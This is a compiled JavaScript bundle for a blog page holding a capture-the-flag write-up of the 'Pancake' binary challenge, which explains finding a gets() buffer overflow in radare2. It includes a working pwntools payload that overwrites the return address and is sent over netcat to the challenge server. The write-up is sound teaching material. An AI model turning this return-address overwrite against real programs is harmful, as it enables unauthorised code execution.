_N_E=(window.webpackJsonp_N_E=window.webpackJsonp_N_E||[]).push([[8],{"38su":function(e,t,n){"use strict";n.r(t),n.d(t,"meta",(function(){return p})),n.d(t,"default",(function(){return f}));var a=n("rePB"),r=n("Ff2n"),o=(n("q1tI"),n("7ljp")),c=n("FYTF"),i=n.n(c);function s(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?s(Object(n),!0).forEach((function(t){Object(a.a)(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):s(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}var p={title:"Pancake (HacktivityCon CTF)",description:"HacktivityCon CTF",date:"August 1, 2020"},u={meta:p};function f(e){var t=e.components,n=Object(r.a)(e,["components"]);return Object(o.a)("wrapper",l(l(l({},u),n),{},{components:t,mdxType:"MDXLayout"}),Object(o.a)("div",{className:i.a.post},Object(o.a)("h1",null,"Pancake (HacktivityCon CTF)"),Object(o.a)("h6",null,"August 1, 2020"),Object(o.a)("p",null,Object(o.a)("strong",{parentName:"p"},"Description"),"\nPancake is a simple binary exploitation challenge from HacktivityCon CTF.\nEntering a long string causes a buffer overflow and pancake segfaults. Some familiarity with radare2 and the call stack will be helpful going through this writeup. A great guide on radare2 can be found ",Object(o.a)("a",l({parentName:"p"},{href:"https://www.megabeets.net/a-journey-into-radare-2-part-1/"}),"here"),".\n",Object(o.a)("strong",{parentName:"p"},"Analysis"),"\nLoad and analyze the binary in radare2. The stack is not executable, but the file isn't protected by ",Object(o.a)("a",l({parentName:"p"},{href:"https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries"}),"canaries")," nor compiled with support for ",Object(o.a)("a",l({parentName:"p"},{href:"https://en.wikipedia.org/wiki/Position-independent_code"}),"position independent code"),". This means that there is no protection against buffer overflows and the segments will always be loaded to the same location."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"$ r2 -A pancakes\n[0x00400700]> iI\narch     x86\nbaddr    0x400000\nbinsz    6995\nbintype  elf\nbits     64\ncanary   false\nnx       true\npic      false\n... (output truncated)\n"))),Object(o.a)("p",null,"List function symbols within the binary. Although most of the functions are from C libraries and calls used by the program, two of them stand out. One of them is ",Object(o.a)("code",null,"main"),", which is always worth checking out. The second is ",Object(o.a)("code",null,"secret_recipe"),", which seems to be a user defined function."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"[0x00400700]> afl\n0x00400700    1 42           entry0\n0x00400740    4 42   -> 37   sym.deregister_tm_clones\n0x00400770    4 58   -> 55   sym.register_tm_clones\n0x004007b0    3 34   -> 29   sym.__do_global_dtors_aux\n0x004007e0    1 7            entry.init0\n0x00400a70    1 2            sym.__libc_csu_fini\n0x00400a74    1 9            sym._fini\n0x0040098b    1 113          sym.secret_recipe\n0x004006d0    1 6            sym.imp.fopen\n0x00400690    1 6            sym.imp.fread\n0x00400680    1 6            sym.imp.puts\n0x00400a00    4 101          sym.__libc_csu_init\n0x00400730    1 2            sym._dl_relocate_static_pie\n0x004007e7   10 420          main\n0x00400648    3 23           sym._init\n0x00400670    1 6            sym.imp.putchar\n0x004006a0    1 6            sym.imp.printf\n0x004006b0    1 6            sym.imp.gets\n0x004006c0    1 6            sym.imp.setvbuf\n0x004006e0    1 6            sym.imp.atoi\n0x004006f0    1 6            sym.imp.usleep\n0x004000ea    1 2            fcn.004000ea\n"))),Object(o.a)("p",null,"Firstly, examine the ",Object(o.a)("code",null,"secret_recipe")," because it's supposed to be a secret. Going over the disassembly, the function is simple. ",Object(o.a)("code",null,"secret_recipe")," opens a file named ",Object(o.a)("code",null,"flag.txt"),", reads it contents and prints it out."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"[0x00400700]> pdf @ sym.secret_recipe\n... (output truncated, radare comments removed for better readability)\n0x004009a5       488d3dce0200.   lea rdi, str.flag.txt\n0x004009ac       e81ffdffff      call sym.imp.fopen\n0x004009b1       488945f0        mov qword [stream], rax\n0x004009b5       488b55f0        mov rdx, qword [stream]\n0x004009b9       488d8560ffff.   lea rax, [ptr]\n0x004009c0       4889d1          mov rcx, rdx\n0x004009c3       ba80000000      mov edx, 0x80\n0x004009c8       be01000000      mov esi, 1\n0x004009cd       4889c7          mov rdi, rax\n0x004009d0       e8bbfcffff      call sym.imp.fread\n0x004009f4       e887fcffff      call sym.imp.puts\n"))),Object(o.a)("p",null,"Next, skimming through the disassembly for ",Object(o.a)("code",null,"main"),", the function also seems fairly straightforward - prints some stuff, gets user input and prints more stuff. ",Object(o.a)("code",null,"main")," uses the ",Object(o.a)("code",null,"gets")," function to get input. ",Object(o.a)("code",null,"gets")," is a deprecated function that does not peform checks on input length, leading to potential buffer overflows exploits. This explains the segfault upon passing in a long string."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"[0x00400700]> pdf @ main\n... (output truncated, radare comments removed for better readability)\n0x0040085b      e860feffff     call sym.imp.setvbuf\n0x00400860      488d3d510300.  lea rdi, str.Welcome_to_the_pancake_stacker\n0x00400867      e814feffff     call sym.imp.puts\n0x0040086c      488d3d650300.  lea rdi, str.How_many_pancakes_do_you_want\n0x00400873      e808feffff     call sym.imp.puts\n0x00400878      488d8570ffff.  lea rax, [str]\n0x0040087f      4889c7         mov rdi, rax\n0x00400882      b800000000     mov eax, 0\n0x00400887      e824feffff     call sym.imp.gets\n0x0040088c      488d8570ffff.  lea rax, [str]\n0x00400893      4889c7         mov rdi, rax\n0x00400896      b800000000     mov eax, 0\n0x0040089b      e840feffff     call sym.imp.atoi\n0x004008a0      8945f0         mov dword [var_10h], eax\n0x004008a3      488d3d4d0300.  lea rdi, str.Cooking_your_cakes\n0x004008aa      b800000000     mov eax, 0\n0x004008af      e8ecfdffff     call sym.imp.printf\n... (output truncated)\n"))),Object(o.a)("p",null,"Note that ",Object(o.a)("code",null,"main")," does not make a call to ",Object(o.a)("code",null,"secret_recipe"),". Maybe the vulnerable ",Object(o.a)("code",null,"gets")," can be exploited to overwrite the return address on the stack?\n",Object(o.a)("strong",{parentName:"p"},"Exploitation"),"\nTo craft the payload, we need to identify the offset in our buffer where the return address will be placed. To do so, generate a ",Object(o.a)("a",l({parentName:"p"},{href:"https://en.wikipedia.org/wiki/De_Bruijn_sequence"}),"De Bruijn Sequence")," long enough string to cause a segfault. The sequence can be generated by using ",Object(o.a)("code",null,"ragg2"),", which is part of the radare project."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"$ ragg2 -P 200 -r\nAAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA%\n"))),Object(o.a)("p",null,"Run radare2 in debug mode ",Object(o.a)("code",null,"r2 -d ./pancake"),". Analyze the binary and set a breakpoint at the ",Object(o.a)("code",null,"ret")," instruction in ",Object(o.a)("code",null,"main"),". This will pause execution of the program just before the ",Object(o.a)("code",null,"main")," function exits, allowing us to examine the stack. ",Object(o.a)("code",null,"dc")," to begin execution of the program, passing the De Bruijn Sequence when prompted. Since we have placed a breakpoint at the end of main, the program should pause execution. Print the first 16 bytes on the stack using ",Object(o.a)("code",null,"pxw 8 @ rsp"),". Using the first four bytes on the stack, calculate the offset using the command ",Object(o.a)("code",null,"wopO 0x41417a41"),". This is where we will place the address to ",Object(o.a)("code",null,"secret_recipe"),"."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"[0x00400700]> pdf @ main\n... (output truncated)\n0x00400984      b800000000     mov eax, 0\n0x00400989      c9             leave\n0x0040098a      c3             ret\n[0x00400700]> db 0x0040098a\n[0x00400700]> dc\n... (output truncated)\nhit breakpoint at: 40098a\n[0x0040098a]> pxw 16 @ rsp\n0x7ffffe1723b8  0x41417a41 0x32414131 0x41334141 0x41413441  AzAA1AA2AA3AA4AA\n[0x0040098a]> wopO 0x41417a41\n152\n"))),Object(o.a)("p",null,"The final payload will be just a buffer of 152 bytes with the address of ",Object(o.a)("code",null,"secret_recipe")," added onto the end. Since data is stored and loaded in little endian format on x86, the address to ",Object(o.a)("code",null,"secret_recipe")," must be passed with the same endianess. Pwntools can be used to easily convert the address into little endian format, instead of doing it manually, which can be tedious. Finally create a file (if it does not already exist) in the same directory named ",Object(o.a)("code",null,"file.txt")," to test the payload."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"$ cat flag.txt\nFLAG{HASH123}\n$ python -c \"from pwn import *; import sys; secret_recipe = 0x0040098b; offset=152; payload = b'A'*offset + p64(secret_recipe); sys.stdout.buffer.write(payload)\" | ./pancakes\n...(output truncated)\nFLAG{HASH123}\n[1]    17531 done                              python -c  |\n       17532 segmentation fault (core dumped)  ./pancakes\n"))),Object(o.a)("p",null,"With the payload working, throw it over netcat to capture the flag."),Object(o.a)("div",{className:i.a.codeblock},Object(o.a)("pre",null,Object(o.a)("code",l({parentName:"pre"},{}),"$ {python -c \"from pwn import *; import sys; secret_recipe = 0x0040098b; offset=152; payload = b'A'*offset + p64(secret_recipe); sys.stdout.buffer.write(payload)\";cat;} | nc jh2i.com 50021\nWelcome to the pancake stacker!\nHow many pancakes do you want?\nCooking your cakes.....\nSmothering them in butter.....\nDrowning them in syrup.....\nThey're ready! Our waiters are bringing them out now...\n        _____________\n       /    ___      \\\\\n      ||    \\\\__\\\\     ||\n      ||      _      ||\n      |\\\\     /\\ \\     /|\n      \\\\ \\\\___/ ^ \\\\___/ /\n      \\\\\\\\____/_^_\\\\____//_\n    __\\\\\\\\____/_^_\\\\____// \\\\\n   /   \\____/_^_\\____/ \\\\ \\\\\n  //                   , /\n  \\\\\\\\___________   ____  /\n               \\\\_______/\nflag{too_many_pancakes_on_the_stack}\n")))))}f.isMDXComponent=!0},"7ljp":function(e,t,n){"use strict";n.d(t,"a",(function(){return d}));var a=n("q1tI"),r=n.n(a);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function c(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?c(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):c(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=r.a.createContext({}),p=function(e){var t=r.a.useContext(l),n=t;return e&&(n="function"===typeof e?e(t):i(i({},t),e)),n},u={inlineCode:"code",wrapper:function(e){var t=e.children;return r.a.createElement(r.a.Fragment,{},t)}},f=r.a.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,c=e.parentName,l=s(e,["components","mdxType","originalType","parentName"]),f=p(n),d=a,b=f["".concat(c,".").concat(d)]||f[d]||u[d]||o;return n?r.a.createElement(b,i(i({ref:t},l),{},{components:n})):r.a.createElement(b,i({ref:t},l))}));function d(e,t){var n=arguments,a=t&&t.mdxType;if("string"===typeof e||a){var o=n.length,c=new Array(o);c[0]=f;var i={};for(var s in t)hasOwnProperty.call(t,s)&&(i[s]=t[s]);i.originalType=e,i.mdxType="string"===typeof e?e:a,c[1]=i;for(var l=2;l<o;l++)c[l]=n[l];return r.a.createElement.apply(null,c)}return r.a.createElement.apply(null,n)}f.displayName="MDXCreateElement"},FYTF:function(e,t,n){e.exports={post:"post_post__1Lsln",codeblock:"post_codeblock__jpvW3"}},Ff2n:function(e,t,n){"use strict";function a(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}n.d(t,"a",(function(){return a}))},Qetd:function(e,t,n){"use strict";var a=Object.assign.bind(Object);e.exports=a,e.exports.default=e.exports},WJUN:function(e,t,n){(window.__NEXT_P=window.__NEXT_P||[]).push(["/blog/pancake",function(){return n("38su")}])},rePB:function(e,t,n){"use strict";function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}n.d(t,"a",(function(){return a}))}},[["WJUN",0,1]]]);